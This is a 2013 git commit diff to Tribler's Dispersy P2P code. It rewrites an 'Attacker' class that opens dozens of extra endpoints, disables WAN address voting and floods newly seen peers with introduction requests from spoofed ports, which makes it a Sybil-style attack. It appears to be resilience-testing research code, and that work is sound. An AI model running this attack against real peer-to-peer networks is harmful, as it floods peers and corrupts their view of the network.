68a5be6a6c57254075fdb3556963228e5a6129a6
Niels Zeilemaker <niels@zeilemaker.nl>
2013-09-24 11:07:40 +0200

    New variant

--- Tribler/community/allchannel/bad_dispersy.py
+++ Tribler/community/allchannel/bad_dispersy.py
@@ -2,51 +2,72 @@ import sys
 from Tribler.dispersy.endpoint import StandaloneEndpoint
 from Tribler.dispersy.candidate import BootstrapCandidate
 
-def send_requests(community, candidate, endpoints):
-    for lan_port, endpoint in endpoints:
-        community.dispersy._endpoint = endpoint
-        community.dispersy._lan_address = (community.dispersy._lan_address[0], lan_port)
-        community.create_introduction_request(candidate, False)
+class Attacker:
 
-def connect(dispersy, endpoints, nr_endpoints):
-    for _ in range(1, nr_endpoints):
-        endpoint = StandaloneEndpoint(endpoints[-1][0] + 1)
-        endpoint.open(dispersy)
+    def __init__(self, dispersy, nr_endpoints=50, nr_candidates=100):
+        self.dispersy = dispersy
+        self.nr_endpoints = nr_endpoints
+        self.nr_candidates = nr_candidates
 
-        endpoints.append((endpoint._port, endpoint))
+        # step 1, start creating some endpoints
+        self.endpoints = []
+        self.connect()
 
-def disconnect(endpoints):
-    for _, endpoint in endpoints:
-        endpoint.close()
+        # step 2, replace wan_address_vote method
+        dispersy.wan_address_vote = lambda address, voter: None
 
-def start_attack(dispersy, nr_endpoints=100):
-    # step 1, start creating some endpoints
-    endpoints = [(dispersy.lan_address[1], dispersy.endpoint)]
-    connect(dispersy, endpoints, nr_endpoints)
+        # step 3, wrap add_candidate method for current communities
+        def add_candidate(community, candidate):
+            if not isinstance(candidate, BootstrapCandidate):
+                if candidate.sock_addr not in community._candidates:
+                    community.old_add_candidate(candidate)
 
-    # step 2, replace wan_address_vote method
-    dispersy.wan_address_vote = lambda address, voter: None
+                    if self.nr_candidates:
+                        dispersy.callback.register(self.send_requests, (community, candidate))
+                        self.nr_candidates -= 1
 
-    # step 3, wrap add_candidate method for current communities
-    def add_candidate(community, candidate):
-        if not isinstance(candidate, BootstrapCandidate):
-            if candidate.sock_addr not in community._candidates:
-                community.old_add_candidate(candidate)
+        for community in dispersy.get_communities():
+            community.old_add_candidate = community.add_candidate
+            community.add_candidate = lambda candidate, community = community: add_candidate(community, candidate)
 
-                send_requests(community, candidate, endpoints)
+        # step 4, schedule disconnect
+        dispersy.callback.register(self.disconnect, delay=300.0)
 
-    def on_intro_request(orig_handler, messages):
-        for message in messages:
-            message.payload._bloom_filter = None
-        orig_handler(messages)
+    def send_requests(self, community, candidate):
+        while not self.disconnected:
+            for lan_port, endpoint in self.endpoints:
+                cur_endpoint = community.dispersy._endpoint
+                cur_lanport = community.dispersy._lan_address[1]
+                cur_wanport = community.dispersy._wan_address[1]
 
-    for community in dispersy.get_communities():
-        community.old_add_candidate = community.add_candidate
-        community.add_candidate = lambda candidate, community = community: add_candidate(community, candidate)
+                community.dispersy._endpoint = endpoint
+                community.dispersy._lan_address = (community.dispersy._lan_address[0], lan_port)
+                community.dispersy._wan_address = (community.dispersy._wan_address[0], lan_port)
 
-        intro_request = community._meta_messages[u"dispersy-introduction-request"]
-        orig_handler = intro_request.handle_callback
-        intro_request._handle_callback = lambda messages, orig_handler = orig_handler: on_intro_request(orig_handler, messages)
+                community.create_introduction_request(candidate, False)
 
-    # step 4, schedule disconnect
-    dispersy.callback.register(disconnect, (endpoints,), delay=300.0)
+                community.dispersy._endpoint = cur_endpoint
+                community.dispersy._lan_address = (community.dispersy._lan_address[0], cur_lanport)
+                community.dispersy._wan_address = (community.dispersy._wan_address[0], cur_wanport)
+
+                yield 2.5
+
+                if self.disconnected:
+                    break
+
+    def connect(self):
+        while len(self.endpoints) < self.nr_endpoints:
+            prevport = self.endpoints[-1][0] if len(self.endpoints) else self.dispersy.lan_address[1] + 1000
+            endpoint = StandaloneEndpoint(prevport + 1)
+            endpoint.open(self.dispersy)
+
+            self.endpoints.append((endpoint._port, endpoint))
+
+        self.disconnected = False
+
+    def disconnect(self):
+        self.disconnected = True
+
+        for _, endpoint in self.endpoints:
+            endpoint.close()
+
